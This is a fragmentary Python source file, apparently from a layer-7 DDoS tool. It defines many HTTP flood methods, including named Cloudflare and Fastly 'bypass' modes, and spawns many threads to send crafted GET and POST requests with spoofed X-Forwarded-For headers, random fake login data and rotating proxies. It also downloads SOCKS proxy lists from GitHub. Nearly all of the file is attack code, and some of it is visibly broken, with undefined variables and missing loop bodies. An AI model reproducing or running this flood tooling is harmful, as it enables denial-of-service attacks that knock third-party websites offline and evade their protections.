...
import threading
from asyncio import sslproto, threads
...
from os import abort, urandom as randbytes
...
l7 = ["CFB","GET","NULL","POST","OVH","HEAD","POSTV2","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","BYPASS","BYPASSV2","CFBV2","HTTP_BETA","CFUAM","BROWSERENGINE","FURY","NULLHEAD","COMBINER","FASTLY-BYPASS","SOCKET"]
...
def start_attack(method, threads, event, socks_type):
    ...
    try:
        if method == "post":
            ...
            for _ in range(threads):
                threading.Thread(target=bypassv2, args=(event, socks_type,url), daemon=True).start()
        elif method == "cfbv2":
            for _ in range(threads):
                threading.Thread(target=cfbv2, args=(event, socks_type), daemon=True).start()
        elif method == "socket":
            for _ in range(threads):
                threading.Thread(target=socket, args=(event), daemon=True).start()
        elif method == "cfuam":
            for _ in range(threads):
            ...
            for _ in range(threads):
                threading.Thread(target=combiner, args=(event, socks_type), daemon=True).start()
        elif method == "fastly-bypass":
            for _ in range(threads):
                threading.Thread(target=Fastlybypass, args=(event, socks_type,timer), daemon=True).start()
    except:
        pass
...
def Headers(method):
    ...
    if method == "get" or method == "getv2" or method == "socket" or method == "httpfast" or method == "httpfastv2" or method == "head" or method == "browserengine":
    ...
    elif method == "cfuam" or method == "nullhead" or method == "bypass":
        ...
        refer = "Referer: https://" + target + path + "\r\n"
        up = "Upgrade-Insecure-Requests: 1\r\n"
        useragent = "User-Agent: " + UserAgent + "null\r\n"
        header = referer + useragent + accept + more2 + more + up + parm + connection + "\r\n\r\n"
    elif method == "fastly-bypass":
        connection =  "GET / HTTP/2.0\r\nHost: " + urlparse(target).netloc + "\r\n"
        fastlytoken = "?token=1441307151_4492f25946a2e8e1414a8bb53dab8a6ba1cf4615"
        connection += "Cache-Control: no-cache\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: https://" + target + path + "\r\n"
        Sec = "Sec-Fetch-Site: same-origin\r\n"
        Sec += "Sec-GPC: 1\r\n"
        Sec += "Sec-Fetch-Mode: navigate\r\n"
        Sec += "Sec-Fetch-Dest: document\r\n"
        up = "Upgrade-Insecure-Requests: 1\r\n"
        connection += "Connection: Keep-Alive\r\n\r\n"
        header = referer + useragent + fastlytoken + accept + up + connection + "\r\n\r\n"
    elif method == "spammer" or method == "postv2" or method == "post" or method == "httpfastv2" or method == "fury":
        ...
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        post_data = "username=%RAND%&password=%RAND%" + target + path + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + post_data + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header
...
class Proxy:
    ...
    def init(self, host: str, port: int, typeInt: int) -> None:
        self.host = host
        self.port = port
...
class HttpFlood(Thread):
    ...
    def SpoofIP(self) -> str:
        spoof: str = Proxy.Random.rand_ipv4()
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ...
                scraper = cfscrape.create_scraper(sess=None)
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(2)
                for _ in range(multiple):
...
def combiner(event, socks_type):
    th = threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
    th = threading.Thread(target=null, args=(event, socks_type), daemon=True).start()
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ...
                cloudscraper.create_scraper(sess=session)
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                time.sleep(1)
                for _ in range(multiple):
            ...
            s.close()
def Fastlybypass(event,socks_type, timer):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("get")
    get_host = "GET " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ...
                ctx.load_default_certs = True
                ctx.get_ca_certs(binary_form=True)
                ctx.wrap_socket(s, server_hostname=target)
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ...
                session = requests.Session()
                session.proxies(proxies=proxy) or session.proxies(proxy=proxy)
                cloudscraper.create_scraper(sess=session)
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(1.5)
...
def postv2(event, socks_type):
    header = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    post_host = "POST " + path + "?" + random_data()  + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = post_host + header
    event.wait()
    while time.time() < timer:
        try:
...
def downloadsocks(choice):
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/Xoosz/socks5c/main/socks5mh.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
